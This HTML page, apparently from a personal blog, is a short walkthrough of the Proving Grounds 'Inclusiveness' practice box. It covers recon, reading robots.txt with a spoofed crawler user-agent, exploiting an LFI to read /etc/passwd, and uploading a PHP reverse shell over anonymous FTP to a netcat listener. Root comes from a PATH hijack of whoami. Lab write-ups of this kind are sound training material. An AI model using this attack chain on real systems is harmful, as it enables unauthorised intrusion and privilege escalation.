@@ -1,0 +1,67 @@
+<html>
+<head>
+	<title>- TLDR - Proving Grounds: Inclusiveness</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="/CSS/blog.css">
+	<link rel="stylesheet" href="/CSS/global.css">
+</head>
+<body class="noselect">
+	<h1 id="title" class="blog_title">
+		<a href="/index.html" class="homelink">
+			Proving Grounds: Inclusiveness<br><a href="/Blogs/TLDR/index.html"><span id="tldr">- TLDR -</span></a>
+		</a>
+	</h1>
+	<div id="big_wrapper" class="wordwrap">
+		<div class="paragraph">
+			<div id="menu">
+				<a href="/index.html" class="menu_item">Home</a>
+				<a href="/Blogs/PG_Inclusiveness/pg_inclusiveness.html" class="menu_item">FULL</a>
+				<a href="/Blogs/TLDR/index.html" class="menu_item">All TLDRs</a>
+				<a href="/Blogs/resources.html" class="menu_item">Resources</a>
+				<hr>
+			</div>
+		</div>
+
+<div class="paragraph">
+	<p None class="subtitle">Intro:</p>
+<p class="content">'Twas a nice box, great confidence booster! Find a way to access the robots.txt page, then exploit an LFI to get a reverse shell. Finally, grab root from a command hijack.</p>
+</div>
+<div class="paragraph">
+	<p None class="subtitle">Recon:</p>
+<p class="content">Start with an nmap to find the target IP as well as open ports: <span class="code">nmap -sT -sV -A -v &lt;target range&gt;</span>. Ports 21, 22, and 80 are open on our target.</p>
+<p class="content">Checking the webpage shows the default Apache2 "It works!" page. We can find directories and files with gobuster: <span class="code">gobuster dir -x .php,.html,.txt,.cgi -u &lt;target ip&gt; -w &lt;wordlist&gt;</span>. We see some standard inaccessible directories (js, css, etc...), as well as robots.txt and some related files (robots.php, seo.html, etc...). Trying to access any of these files returns a suspicious sentence: "You are not a search engine! You can't read my robots.txt!". This doesn't seem like a standard error message, so we will pursue it and try to access the robots.txt file.</p>
+<p class="content">We can briefly check the FTP server, which allows anonymous logins. There are no contents other than an empty "pub" directory. However, we are able to write to this folder, which we'll keep in our back pocket.</p>
+</div>
+<div class="paragraph">
+	<p None class="subtitle">Accessing robots.txt:</p>
+<p class="content">The error message returned when trying to access robots.txt indicates that we need to spoof a web crawler. To do this, we find a web crawler user-agent: <span class="code">Googlebot/2.1 (+http://www.google.com/bot.html)</span>. We can then simply access the file using curl, while adding the spoofed user-agent header: <span class="code">curl -H 'User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)' &lt;target ip&gt;/robots.txt</span>. This will show us a secret directory: "/secret_information/".</p>
+</div>
+<div class="paragraph">
+	<p None class="subtitle">Finding the LFI:</p>
+<p class="content">Accessing this secret directory brings us a page explaining a DNS Zone Transfer Attack. There are also two links that each change the page's language: "english" and "spanish". Clicking either link sends a request to the current page with the url parameter of <span class="code">lang="en.php"</span>, for english in this case. Suspecting an LFI attack, we can try changing the "en.php" to "/etc/passwd". This allows us to dump the passwd file's contents!</p>
+</div>
+<div class="paragraph">
+	<p None class="subtitle">Getting A Shell:</p>
+<p class="content">Because we can reach local files, and we know the server accepts php (from the "en.php" file), we can run a php reverse shell. To upload the shell, we need to anonymously connect to the ftp server, navigate to the "pub" directory, and upload the reverse shell. Assuming you're in the rshell directory: <span class="code_block"><br>ftp &lt;target ip&gt;<br>
+&#x23;Login anonymously<br>
+cd pub<br>
+put php_reverse_shell.php</span><br>Setup a netcat listener (<span class="code">nc -lvp 3184</span>) and navigate to the reverse shell in your browser. The default FTP server's root is located at "/var/ftp/", so we need to go to "http://<target ip>/secret_information/?lang=/var/ftp/pub/php_reverse_shell.php". We should see a connection on our listener. Upgrade the shell: <span class="code">python -c 'import pty;pty.spawn("/bin/bash")' </span>. We find a user "tom" who's home directory has some interesting files...</p>
+</div>
+<div class="paragraph">
+	<p None class="subtitle">Getting Root:</p>
+<p class="content">In Tom's home directory, we find a pair of files: "rootshell" and "rootshell.c". Checking out the rootshell.c code we find that it spawns an EUID root shell if the user's name is "tom". This is verified by the "whoami" command.</p>
+<p class="content">We can hijack the whoami command and write a script that simply prints "tom". To do this, we need to move to a writeable directory, such as "/tmp". Create a file named "whoami" with executable permission. This file will be a bash script that echoes "tom". We can do this in a one-liner: <span class="code">echo $'&#x23;!/bin/bash
+echo "tom"' &gt; ./whoami; chmod +x ./whoami</span>. Next, add /tmp to the PATH env: <span class="code">export PATH=/tmp:${PATH}</span>. Finally, we can move back into tom's home dir and execute the rootshell! Once we're in, grab the flag and celebrate!</p>
+</div>
+		<br>
+		<div class="paragraph">
+			<hr>
+			<p class="content">Last edit: 2021.09.09</p>
+		</div>
+	</div>
+</body>
+<footer>
+	<script type="text/javascript" src="/JS/blog.js"></script>
+</footer>
+</html>
